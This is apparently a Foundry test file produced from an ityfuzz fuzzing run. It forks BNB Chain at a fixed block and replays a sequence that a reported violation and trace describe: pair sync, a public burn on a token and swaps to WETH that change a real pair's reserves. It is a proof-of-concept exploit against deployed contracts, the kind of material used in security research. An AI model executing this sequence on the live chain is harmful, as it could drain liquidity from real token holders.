// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x10bc28d2810dD462E16facfF18f78783e859351b,0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A -c bsc --onchain-block-number 20954695 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0xf9e3151e813cd6729d52d9a0c3ee69f22cce650a, Reserves changed from (0x0000000000000000000000000000000000000000000000410e7284d070afcdbe_U256, 0x000000000000000000000000000000000000000000000000002386608421a206_U256) to (0x0000000000000000000000000000000000000000000000410e7284d070afcdbe_U256, 0x000000000000000000000000000000000000000000000000002386608421ae81_U256)

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A.sync()
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A → WETH), address(this), block.timestamp);
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] 0x10bc28d2810dD462E16facfF18f78783e859351b.burn(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A, 3195)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x10bc28d2810dD462E16facfF18f78783e859351b → WETH), address(this), block.timestamp);
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A.sync()


 */

contract Cbb4C is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 20954695);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A).sync();
        
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A).balanceOf(address(this));
        IERC20(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        
        0x10bc28d2810dD462E16facfF18f78783e859351b.call(abi.encodeWithSignature(
            "burn(address,uint256)",0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A, 3195
        )); 
        vm.startPrank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        uint256 amount1 = IERC20(0x10bc28d2810dD462E16facfF18f78783e859351b).balanceOf(address(this));
        IERC20(0x10bc28d2810dD462E16facfF18f78783e859351b).approve(router, amount1);
        address[] memory liq_path1 = new address[](2);
        liq_path1[0] = 0x10bc28d2810dD462E16facfF18f78783e859351b;
        liq_path1[1] = address(weth);
        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, amount1);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount1, 0, liq_path1, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A).sync();
        
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
